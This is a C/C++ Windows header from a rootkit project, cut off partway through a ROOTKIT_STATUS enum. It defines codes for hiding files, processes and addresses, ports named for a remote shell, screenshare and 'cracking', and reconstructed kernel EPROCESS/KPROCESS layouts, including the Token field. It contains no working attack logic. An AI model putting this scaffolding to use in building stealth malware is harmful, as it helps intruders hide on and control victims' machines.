#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WS2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <random>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winnt.h>
#include <iostream>
#include <stdint.h>
#define MEDIUM_AS_SOURCE_MODULE "mymyymym"
#define REGULAR_BUFFER_WRITE "regular"
#define REGULAR_BUFFER 0xDEAFBEED
#define TARGET_WEBSERVER 8050
#define TARGET_SHELL 8060
#define TARGET_SCREENSHARE 8070
#define TARGET_CRACKING 8090


/*
=====================
REQUIRED DEFINITIONS:
=====================
*/


// Definitions of file hiding values:
#define SHOW_HIDDEN 0x7777FFFFFFFFFFFF  // Remove a file from HookHide
#define HIDE_FILE 0xFFFFFFFFFFFFFFFF  // Hide a file in HookHide
#define UNHIDE_FILEFOLDER ((NTSTATUS)0x00000121L)  // Temporary success for un-hiding file/folder
#define HIDE_FILEFOLDER  ((NTSTATUS)0x40000028L)  // Temporary success for hiding file/folder
#define SHOWHIDDEN_FILEFOLDER ((NTSTATUS)0x00000125L)  // Temporary success for showing list


#define UNHIDE_PROCESS ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding process
#define HIDE_PROCESS ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding process
#define SHOWHIDDEN_PROCESS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden processes
#define REMOVE_BY_INDEX_PID 0xFCFCFCCFCFCFDB  // Value of PID when asking to remove by index and not by PID
#define UnhideProcess 0xC0C0C0C00C0C0C0C
#define HideProcess 0xCDCDCDCDDCDCDCDC
#define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0

#define UNHIDE_ADDR ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding addresses
#define HIDE_ADDR ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding addresses
#define SHOWHIDDEN_ADDRS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden addresses
#define REMOVE_BY_INDEX_ADDR 0xFFFFFFFF
#define UnhideAddress 0xC0C0C0C00C0C0C0C
#define HideAddress 0xCDCDCDCDDCDCDCDC
#define ListHiddenAddresses 0x0D0D0D0DD0D0D0D0
#define DEFAULT_MEDIUM_PORT 44444


#define EX_PUSH_LOCK ULONG_PTR

typedef struct _EX_RUNDOWN_REF {

#define EX_RUNDOWN_ACTIVE      0x1
#define EX_RUNDOWN_COUNT_SHIFT 0x1
#define EX_RUNDOWN_COUNT_INC   (1<<EX_RUNDOWN_COUNT_SHIFT)

	union {
		__volatile ULONG_PTR Count;
		__volatile PVOID Ptr;
	};
} EX_RUNDOWN_REF, * PEX_RUNDOWN_REF;

typedef struct _EX_FAST_REF {
	PVOID Object;
} EX_FAST_REF, * PEX_FAST_REF;

typedef struct _RTL_BALANCED_NODE {
	union {
		struct _RTL_BALANCED_NODE* Children[2];
		struct {
			struct _RTL_BALANCED_NODE* Left;
			struct _RTL_BALANCED_NODE* Right;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;

#define RTL_BALANCED_NODE_RESERVED_PARENT_MASK 3

	union {
		UCHAR Red : 1;
		UCHAR Balance : 2;
		ULONG_PTR ParentValue;
	} DUMMYUNIONNAME2;
} RTL_BALANCED_NODE, * PRTL_BALANCED_NODE;

typedef struct _RTL_AVL_TREE {
	RTL_BALANCED_NODE* Root;
} RTL_AVL_TREE, * PRTL_AVL_TREE;

typedef struct _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES {
	RTL_AVL_TREE Tree;
	EX_PUSH_LOCK Lock;
} PS_DYNAMIC_ENFORCED_ADDRESS_RANGES, * PPS_DYNAMIC_ENFORCED_ADDRESS_RANGES;

typedef struct _KAFFINITY_EX {
	char Affinity[0xA8];
} KAFFINITY_EX, * PKAFFINITY_EX;

typedef struct _KSTACK_COUNT {
	ULONG State;
	ULONG StackCount;
} KSTACK_COUNT, * PKSTACK_COUNT;

typedef struct _MMSUPPORT_FLAGS {
	/*
	0x000 WorkingSetType   : Pos 0, 3 Bits
		+ 0x000 Reserved0 : Pos 3, 3 Bits
		+ 0x000 MaximumWorkingSetHard : Pos 6, 1 Bit
		+ 0x000 MinimumWorkingSetHard : Pos 7, 1 Bit
		+ 0x001 SessionMaster : Pos 0, 1 Bit
		+ 0x001 TrimmerState : Pos 1, 2 Bits
		+ 0x001 Reserved : Pos 3, 1 Bit
		+ 0x001 PageStealers : Pos 4, 4 Bits
		*/
	USHORT u1;
	UCHAR MemoryPriority;
	/*
	+ 0x003 WsleDeleted : Pos 0, 1 Bit
	+ 0x003 SvmEnabled : Pos 1, 1 Bit
	+ 0x003 ForceAge : Pos 2, 1 Bit
	+ 0x003 ForceTrim : Pos 3, 1 Bit
	+ 0x003 NewMaximum : Pos 4, 1 Bit
	+ 0x003 CommitReleaseState : Pos 5, 2 Bits
	*/
	UCHAR u2;
}MMSUPPORT_FLAGS, * PMMSUPPORT_FLAGS;

typedef struct _MMSUPPORT_INSTANCE {
	UINT NextPageColor;
	UINT PageFaultCount;
	UINT64 TrimmedPageCount;
	PVOID VmWorkingSetList;
	LIST_ENTRY WorkingSetExpansionLinks;
	UINT64 AgeDistribution[8];
	PVOID ExitOutswapGate;
	UINT64 MinimumWorkingSetSize;
	UINT64 WorkingSetLeafSize;
	UINT64 WorkingSetLeafPrivateSize;
	UINT64 WorkingSetSize;
	UINT64 WorkingSetPrivateSize;
	UINT64 MaximumWorkingSetSize;
	UINT64 PeakWorkingSetSize;
	UINT HardFaultCount;
	USHORT LastTrimStamp;
	USHORT PartitionId;
	UINT64 SelfmapLock;
	MMSUPPORT_FLAGS Flags;
} MMSUPPORT_INSTANCE, * PMMSUPPORT_INSTANCE;

typedef struct _MMSUPPORT_SHARED {
	long WorkingSetLock;
	long GoodCitizenWaiting;
	UINT64 ReleasedCommitDebt;
	UINT64 ResetPagesRepurposedCount;
	PVOID WsSwapSupport;
	PVOID CommitReleaseContext;
	PVOID AccessLog;
	UINT64 ChargedWslePages;
	UINT64 ActualWslePages;
	UINT64 WorkingSetCoreLock;
	PVOID ShadowMapping;
} MMSUPPORT_SHARED, * PMMSUPPORT_SHARED;

typedef struct _MMSUPPORT_FULL {
	MMSUPPORT_INSTANCE Instance;
	MMSUPPORT_SHARED Shared;
	UCHAR Padding[48];
} MMSUPPORT_FULL, * PMMSUPPORT_FULL;

typedef struct _ALPC_PROCESS_CONTEXT {
	char AlpcContext[0x20];
} ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;

typedef struct _JOBOBJECT_WAKE_FILTER {
	UINT HighEdgeFilter;
	UINT LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

typedef struct _PS_PROCESS_WAKE_INFORMATION {
	UINT64 NotificationChannel;
	UINT WakeCounters[7];
	JOBOBJECT_WAKE_FILTER WakeFilter;
	UINT NoWakeCounter;
} PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;

typedef struct _PS_PROTECTION
{
	union
	{
		UCHAR Level;                                                        //0x0
		struct
		{
			UCHAR Type : 3;                                                   //0x0
			UCHAR Audit : 1;                                                  //0x0
			UCHAR Signer : 4;                                                 //0x0
		};
	};
} PS_PROTECTION, * PPS_PROTECTION;

#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

typedef struct _DISPATCHER_HEADER {
	union {
		union {
			volatile LONG Lock;
			LONG LockNV;
		} DUMMYUNIONNAME;

		struct {                            // Events, Semaphores, Gates, etc.
			UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
			UCHAR Signalling;
			UCHAR Size;
			UCHAR Reserved1;
		} DUMMYSTRUCTNAME;

		struct {                            // Timer
			UCHAR TimerType;
			union {
				UCHAR TimerControlFlags;
				struct {
					UCHAR Absolute : 1;
					UCHAR Wake : 1;
					UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
				} DUMMYSTRUCTNAME;
			};

			UCHAR Hand;
			union {
				UCHAR TimerMiscFlags;
				struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

					UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

					UCHAR Index : 1;
					UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

					UCHAR Inserted : 1;
					volatile UCHAR Expired : 1;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;
		} DUMMYSTRUCTNAME2;

		struct {                            // Timer2
			UCHAR Timer2Type;
			union {
				UCHAR Timer2Flags;
				struct {
					UCHAR Timer2Inserted : 1;
					UCHAR Timer2Expiring : 1;
					UCHAR Timer2CancelPending : 1;
					UCHAR Timer2SetPending : 1;
					UCHAR Timer2Running : 1;
					UCHAR Timer2Disabled : 1;
					UCHAR Timer2ReservedFlags : 2;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR Timer2ComponentId;
			UCHAR Timer2RelativeId;
		} DUMMYSTRUCTNAME3;

		struct {                            // Queue
			UCHAR QueueType;
			union {
				UCHAR QueueControlFlags;
				struct {
					UCHAR Abandoned : 1;
					UCHAR DisableIncrement : 1;
					UCHAR QueueReservedControlFlags : 6;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR QueueSize;
			UCHAR QueueReserved;
		} DUMMYSTRUCTNAME4;

		struct {                            // Thread
			UCHAR ThreadType;
			UCHAR ThreadReserved;

			union {
				UCHAR ThreadControlFlags;
				struct {
					UCHAR CycleProfiling : 1;
					UCHAR CounterProfiling : 1;
					UCHAR GroupScheduling : 1;
					UCHAR AffinitySet : 1;
					UCHAR Tagged : 1;
					UCHAR EnergyProfiling : 1;
					UCHAR SchedulerAssist : 1;

#if !defined(_X86_)

					UCHAR ThreadReservedControlFlags : 1;

#else

					UCHAR Instrumented : 1;

#endif

				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			union {
				UCHAR DebugActive;

#if !defined(_X86_)

				struct {
					BOOLEAN ActiveDR7 : 1;
					BOOLEAN Instrumented : 1;
					BOOLEAN Minimal : 1;
					BOOLEAN Reserved4 : 2;
					BOOLEAN AltSyscall : 1;
					BOOLEAN Emulation : 1;
					BOOLEAN Reserved5 : 1;
				} DUMMYSTRUCTNAME;

#endif

			} DUMMYUNIONNAME2;
		} DUMMYSTRUCTNAME5;

		struct {                         // Mutant
			UCHAR MutantType;
			UCHAR MutantSize;
			BOOLEAN DpcActive;
			UCHAR MutantReserved;
		} DUMMYSTRUCTNAME6;
	} DUMMYUNIONNAME;

	LONG SignalState;                   // Object lock
	LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _WNF_STATE_NAME {
	ULONG Data[2];
} WNF_STATE_NAME;


// Internal EPROCESS/KPROCESS of 1809:
typedef struct _ACTKPROCESS {
	DISPATCHER_HEADER Header;
	LIST_ENTRY ProfileListHead;
	UINT64 DirectoryTableBase;
	LIST_ENTRY ThreadListHead;
	UINT ProcessLock;
	UINT ProcessTimerDelay;
	UINT64 DeepFreezeStartTime;
	KAFFINITY_EX Affinity;
	UINT64 AffinityPadding[12];
	LIST_ENTRY ReadyListHead;
	SINGLE_LIST_ENTRY SwapListEntry;
	KAFFINITY_EX ActiveProcessors;
	UINT64 ActiveProcessorsPadding[12];
	/*
   AutoAlignment    : Pos 0; 1 Bit
   DisableBoost     : Pos 1; 1 Bit
   DisableQuantum   : Pos 2; 1 Bit
   DeepFreeze       : Pos 3; 1 Bit
   TimerVirtualization : Pos 4; 1 Bit
   CheckStackExtents : Pos 5; 1 Bit
   CacheIsolationEnabled : Pos 6; 1 Bit
   PpmPolicy        : Pos 7; 3 Bits
   ActiveGroupsMask : Pos 10; 20 Bits
   VaSpaceDeleted   : Pos 30; 1 Bit
   ReservedFlags    : Pos 31; 1 Bit
	*/
	int ProcessFlags;
	int ActiveGroupsMask;
	char BasePriority;
	char QuantumReset;
	char Visited;
	char Flags;
	USHORT ThreadSeed[20];
	USHORT ThreadSeedPadding[12];
	USHORT IdealProcessor[20];
	USHORT IdealProcessorPadding[12];
	USHORT IdealNode[20];
	USHORT IdealNodePadding[12];
	USHORT IdealGlobalNode;
	USHORT Spare1;
	KSTACK_COUNT StackCount;
	LIST_ENTRY ProcessListEntry;
	UINT64 CycleTime;
	UINT64 ContextSwitches;
	PVOID SchedulingGroup;
	UINT FreezeCount;
	UINT KernelTime;
	UINT UserTime;
	UINT ReadyTime;
	UINT64 UserDirectoryTableBase;
	UCHAR AddressPolicy;
	UCHAR Spare[71];
	PVOID InstrumentationCallback;
	PVOID SecureState;
	PVOID KernelWaitTime;
	PVOID UserWaitTime;
	UINT64 EndPadding[8];
} ACTKPROCESS, * PACTKPROCESS;

typedef struct _ACTEPROCESS {
	ACTKPROCESS Pcb;
	EX_PUSH_LOCK ProcessLock;
	PVOID UniqueProcessId;
	LIST_ENTRY ActiveProcessLinks;
	EX_RUNDOWN_REF RundownProtect;
	UINT Flags2;
	/*
		+ 0x300 JobNotReallyActive : Pos 0, 1 Bit
		+ 0x300 AccountingFolded : Pos 1, 1 Bit
		+ 0x300 NewProcessReported : Pos 2, 1 Bit
		+ 0x300 ExitProcessReported : Pos 3, 1 Bit
		+ 0x300 ReportCommitChanges : Pos 4, 1 Bit
		+ 0x300 LastReportMemory : Pos 5, 1 Bit
		+ 0x300 ForceWakeCharge : Pos 6, 1 Bit
		+ 0x300 CrossSessionCreate : Pos 7, 1 Bit
		+ 0x300 NeedsHandleRundown : Pos 8, 1 Bit
		+ 0x300 RefTraceEnabled : Pos 9, 1 Bit
		+ 0x300 PicoCreated : Pos 10, 1 Bit
		+ 0x300 EmptyJobEvaluated : Pos 11, 1 Bit
		+ 0x300 DefaultPagePriority : Pos 12, 3 Bits
		+ 0x300 PrimaryTokenFrozen : Pos 15, 1 Bit
		+ 0x300 ProcessVerifierTarget : Pos 16, 1 Bit
		+ 0x300 RestrictSetThreadContext : Pos 17, 1 Bit
		+ 0x300 AffinityPermanent : Pos 18, 1 Bit
		+ 0x300 AffinityUpdateEnable : Pos 19, 1 Bit
		+ 0x300 PropagateNode : Pos 20, 1 Bit
		+ 0x300 ExplicitAffinity : Pos 21, 1 Bit
		+ 0x300 ProcessExecutionState : Pos 22, 2 Bits
		+ 0x300 EnableReadVmLogging : Pos 24, 1 Bit
		+ 0x300 EnableWriteVmLogging : Pos 25, 1 Bit
		+ 0x300 FatalAccessTerminationRequested : Pos 26, 1 Bit
		+ 0x300 DisableSystemAllowedCpuSet : Pos 27, 1 Bit
		+ 0x300 ProcessStateChangeRequest : Pos 28, 2 Bits
		+ 0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit
		+ 0x300 InPrivate : Pos 31, 1 Bit
		*/
	UINT Flags;
	/*
+ 0x304 CreateReported : Pos 0, 1 Bit
+ 0x304 NoDebugInherit : Pos 1, 1 Bit
+ 0x304 ProcessExiting : Pos 2, 1 Bit
+ 0x304 ProcessDelete : Pos 3, 1 Bit
+ 0x304 ManageExecutableMemoryWrites : Pos 4, 1 Bit
+ 0x304 VmDeleted : Pos 5, 1 Bit
+ 0x304 OutswapEnabled : Pos 6, 1 Bit
+ 0x304 Outswapped : Pos 7, 1 Bit
+ 0x304 FailFastOnCommitFail : Pos 8, 1 Bit
+ 0x304 Wow64VaSpace4Gb : Pos 9, 1 Bit
+ 0x304 AddressSpaceInitialized : Pos 10, 2 Bits
+ 0x304 SetTimerResolution : Pos 12, 1 Bit
+ 0x304 BreakOnTermination : Pos 13, 1 Bit
+ 0x304 DeprioritizeViews : Pos 14, 1 Bit
+ 0x304 WriteWatch : Pos 15, 1 Bit
+ 0x304 ProcessInSession : Pos 16, 1 Bit
+ 0x304 OverrideAddressSpace : Pos 17, 1 Bit
+ 0x304 HasAddressSpace : Pos 18, 1 Bit
+ 0x304 LaunchPrefetched : Pos 19, 1 Bit
+ 0x304 Background : Pos 20, 1 Bit
+ 0x304 VmTopDown : Pos 21, 1 Bit
+ 0x304 ImageNotifyDone : Pos 22, 1 Bit
+ 0x304 PdeUpdateNeeded : Pos 23, 1 Bit
+ 0x304 VdmAllowed : Pos 24, 1 Bit
+ 0x304 ProcessRundown : Pos 25, 1 Bit
+ 0x304 ProcessInserted : Pos 26, 1 Bit
+ 0x304 DefaultIoPriority : Pos 27, 3 Bits
+ 0x304 ProcessSelfDelete : Pos 30, 1 Bit
+ 0x304 SetTimerResolutionLink : Pos 31, 1 Bit
*/
	LARGE_INTEGER CreateTime;
	UINT64 ProcessQuotaUsage[2];
	UINT64 ProcessQuotaPeak[2];
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	LIST_ENTRY SessionProcessLinks;
	PVOID ExceptionPortData;  // also defined as UINT64 ExceptionPortValue;
	/*
+ 0x350 ExceptionPortState : Pos 0, 3 Bits
*/
	EX_FAST_REF Token;
	UINT64 MmReserved;
	ULONG_PTR AddressCreationLock;
	ULONG_PTR PageTableCommitmentLock;
	PVOID RotateInProgress;
	PVOID ForkInProgress;
	PVOID CommitChargeJob;
	ULONG64 CloneRoot;
	UINT64 NumberOfPrivatePages;
	UINT64 NumberOfLockedPages;
	PVOID Win32Process;
	PVOID Job;
	PVOID SectionObject;
	PVOID SectionBaseAddress;
	UINT64 Cookie;
	PVOID WorkingSetWatch;
	PVOID Win32WindowStation;
	PVOID InheritedFromUniqueProcessId;
	UINT64 OwnerProcessId;
	PVOID Peb;
	PVOID Session;
	PVOID Spare1;
	PVOID QuotaBlock;
	PVOID ObjectTable;
	PVOID DebugPort;
	PVOID WoW64Process;
	PVOID DeviceMap;
	PVOID EtwDataSource;
	UINT64 PageDirectoryPte;
	PVOID ImageFilePointer;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID SecurityPort;
	ULONG64 SeAuditProcessCreationInfo;
	LIST_ENTRY JobLinks;
	PVOID HighestUserAddress;
	LIST_ENTRY ThreadListHead;
	UINT ActiveThreads;
	UINT ImagePathHash;
	UINT DefaultHardErrorProcessing;
	int LastThreadExitStatus;
	EX_FAST_REF PrefetchTrace;
	PVOID LockedPagesList;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	UINT64 CommitChargeLimit;
	UINT64 CommitCharge;
	UCHAR CommitChargePeak[48];
	MMSUPPORT_FULL Vm;
	LIST_ENTRY MmProcessLinks;
	UINT ModifiedPageCount;
	int ExitStatus;
	RTL_AVL_TREE VadRoot;
	PVOID VadHint;
	UINT64 VadCount;
	UINT64 VadPhysicalPages;
	UINT64 VadPhysicalPagesLimit;
	ALPC_PROCESS_CONTEXT AlpcContext;

	LIST_ENTRY TimerResolutionLink;
	PVOID TimerResolutionStackRecord;
	UINT RequestedTimerResolution;
	UINT SmallestTimerResolution;
	LARGE_INTEGER ExitTime;
	PVOID InvertedFunctionTable;
	EX_PUSH_LOCK InvertedFunctionTableLock;
	UINT ActiveThreadsHighWatermark;
	UINT LargePrivateVadCount;
	EX_PUSH_LOCK ThreadListLock;
	PVOID WnfContext;
	PVOID ServerSilo;
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
	union {
		UCHAR HangCount;
		UCHAR GhostCount;
		UCHAR PrefilterException;
	};
	union {
		UINT Flags3;
		UINT Minimal;
		UINT ReplacingPageRoot;
		UINT Crashed;
		UINT JobVadsAreTracked;
		UINT VadTrackingDisabled;
		UINT AuxiliaryProcess;
		UINT SubsystemProcess;
		UINT IndirectCpuSets;
		UINT RelinquishedCommit;
		UINT HighGraphicsPriority;
		UINT CommitFailLogged;
		UINT ReserveFailLogged;
		UINT SystemProcess;
		UINT HideImageBaseAddresses;
		UINT AddressPolicyFrozen;
		UINT ProcessFirstResume;
		UINT ForegroundExternal;
		UINT ForegroundSystem;
		UINT HighMemoryPriority;
		UINT EnableProcessSuspendResumeLogging;
		UINT EnableThreadSuspendResumeLogging;
		UINT SecurityDomainChanged;
		UINT SecurityFreezeComplete;
		UINT VmProcessorHost;
		UINT VmProcessorHostTransition;
		UINT AltSyscall;
		UINT TimerResolutionIgnore;
		UINT DisallowUserTerminate;
	};

	INT64 DeviceAsid;
	PVOID SvmData;
	EX_PUSH_LOCK SvmProcessLock;
	UINT64 SvmLock;

	LIST_ENTRY SvmProcessDeviceListHead;
	UINT64 LastFreezeInterruptTime;
	PVOID DiskCounters;
	PVOID PicoContext;
	PVOID EnclaveTable;
	UINT64 EnclaveNumber;
	EX_PUSH_LOCK EnclaveLock;

	UINT64 HighPriorityFaultsAllowed;
	PVOID EnergyContext;
	PVOID VmContext;
	UINT64 SequenceNumber;
	UINT64 CreateInterruptTime;
	UINT64 CreateUnbiasedInterruptTime;
	UINT64 TotalUnbiasedFrozenTime;
	UINT64 LastAppStateUpdateTime;

	union {
		ULONG64 LastAppStateUptime;
		ULONG64 LastAppState;
	};

	UINT64 SharedCommitCharge;
	EX_PUSH_LOCK SharedCommitLock;
	LIST_ENTRY SharedCommitLinks;

	union {
		UINT64 AllowedCpuSets;
		UINT64 AllowedCpuSetsIndirect;
	};
	union {
		UINT64 DefaultCpuSets;
		UINT64 DefaultCpuSetsIndirect;
	};

	PVOID DiskIoAttribution;
	PVOID DxgProcess;
	UINT64 Win32KFilterSet;
	ULONG64 ProcessTimerDelay;
	UINT KTimerSets;
	UINT KTimer2Sets;
	UINT64 ThreadTimerSets;
	UINT64 VirtualTimerListLock;


	LIST_ENTRY VirtualTimerListHead;
	union {
		WNF_STATE_NAME WakeChannel;
		PS_PROCESS_WAKE_INFORMATION WakeInfo;
	};

	union {
		UINT MitigationFlags;
		UINT MitigationFlagsValues;
	};

	union {
		UINT MitigationFlags2;
		UINT MitigationFlags2Values;
	};
	PVOID PartitionObject;
	UINT64 SecurityDomain;
	UINT64 ParentSecurityDomain;
	PVOID CoverageSamplerContext;
	PVOID MmHotPatchContext;
	RTL_AVL_TREE DynamicEHContinuationTargetsTree;
	EX_PUSH_LOCK DynamicEHContinuationTargetsLock;
	PS_DYNAMIC_ENFORCED_ADDRESS_RANGES DynamicEnforcedCetCompatibleRanges;
	UINT64 DisabledComponentFlags;
	UINT64 PathRedirectionHashes;

	union {
		ULONG MitigationFlags3[4];
		ULONG MitigationFlags3Values[4];
	};
} ACTEPROCESS, * PACTEPROCESS;

typedef struct _SHORTENEDACTEPROCESS {
	PVOID UniqueProcessId;
	UINT Flags;
	LARGE_INTEGER CreateTime;
	UINT64 PeakVirtualSize;
	UINT64 VirtualSize;
	UINT64 Cookie;
	UINT64 OwnerProcessId;
	UINT64 PageDirectoryPte;
	UCHAR ImageFileName[15];
	UCHAR PriorityClass;
	PVOID HighestUserAddress;
	UINT ActiveThreads;
	int LastThreadExitStatus;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	int ExitStatus;
} SHORTENEDACTEPROCESS, * PSHORTENEDACTEPROCESS;


// special return type for specific cases (send, receive..) -
typedef struct _PASS_DATA {
	int value;
	BOOL err;
	BOOL Term;
}PASS_DATA, * PPASS_DATA;


// network info structure for each side -
typedef struct _NETWORK_INFO {
	const char* IP;
	USHORT Port;
	sockaddr_in AddrInfo;
	SOCKET AsoSock;
}NETWORK_INFO, * PNETWORK_INFO;


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;


#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID* PCLIENT_ID;


// structs about requesting specific data from ZwQuerySystemInformation -
typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, * PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	LONG Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG RegistryQuotaAllowed;
	ULONG RegistryQuotaUsed;
	PVOID Reserved1;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, * PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
	BYTE Reserved1[24];
	PVOID Reserved2[4];
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
	BYTE Reserved1[48];
} SYSTEM_TIMEOFDAY_INFORMATION, * PSYSTEM_TIMEOFDAY_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	BYTE Reserved1[312];
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION {
	BYTE Reserved1[16];
} SYSTEM_EXCEPTION_INFORMATION, * PSYSTEM_EXCEPTION_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	BYTE Reserved1[32];
} SYSTEM_LOOKASIDE_INFORMATION, * PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	BYTE Reserved1[24];
} SYSTEM_INTERRUPT_INFORMATION, * PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_POLICY_INFORMATION {
	PVOID Reserved1[2];
	ULONG Reserved2[3];
} SYSTEM_POLICY_INFORMATION, * PSYSTEM_POLICY_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
	ULONG   Length;
	ULONG   CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, * PSYSTEM_CODEINTEGRITY_INFORMATION;


// Struct to get information about a specific process module -
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45,
	SystemCodeIntegrityInformation = 103,
	SystemPolicyInformation = 134,
	SystemModuleInformation = 0xB,
} SYSTEM_INFORMATION_CLASS;


/*
============================
DEPENDENCIES OF MAIN STRUCT:
============================
*/


// special statuses for different events and requests -
typedef enum _ROOTKIT_STATUS {
	ROOTKSTATUS_SUCCESS = 0xFF000000,
	ROOTKSTATUS_SYSTEMSPC = 0xFF000001,
	ROOTKSTATUS_PRCPEB = 0xFF000002,
	ROOTKSTATUS_PRCLOADMDLS = 0xFF000003,
	ROOTKSTATUS_OTHER = 0xFF000004,
	ROOTKSTATUS_ADRBUFSIZE = 0xFF000005,
	ROOTKSTATUS_QUERYVIRTMEM = 0xFF000006,
	ROOTKSTATUS_INVARGS = 0xFF000007,
	ROOTKSTATUS_PROTECTIONSTG = 0xFF000008,
	ROOTKSTATUS_NOWRITEPRMS = 0xFF000009,
	ROOTKSTATUS_COPYFAIL = 0x0000000A,
	ROOTKSTATUS_LESSTHNREQ = 0xFF00000B,
	ROOTKSTATUS_MEMALLOC = 0xFF00000C,
	ROOTKSTATUS_NOTCOMMITTED = 0xFF00000D,
	ROOTKSTATUS_QUERYSYSINFO = 0xFF00000E,
	ROOTKSTATUS_PROCHANDLE = 0xFF00000F,
	ROOTKSTATUS_ACSVIO = 0xFF000010,
	ROOTKSTATUS_NOTSUPPORTED = 0xFF000011,
	ROOTKSTATUS_NOTINRELRANGE = 0xFF000012,
